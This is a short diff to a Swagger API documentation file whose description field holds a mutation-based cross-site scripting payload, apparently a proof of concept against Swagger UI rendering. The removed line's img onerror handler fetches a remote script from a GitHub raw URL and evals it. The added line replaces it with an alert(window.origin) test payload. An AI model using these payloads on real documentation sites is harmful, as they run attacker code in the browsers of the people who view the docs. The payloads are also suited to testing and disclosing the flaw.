@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch('https://raw.githubusercontent.com/Tanmay95/swagger-xss/main/script.js').then(function(res){res.text().then(function(data){eval(data)})}) src=1>"></form>
+    <form><math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>"></form>
 
   version: production
 basePath: /JSSResource/
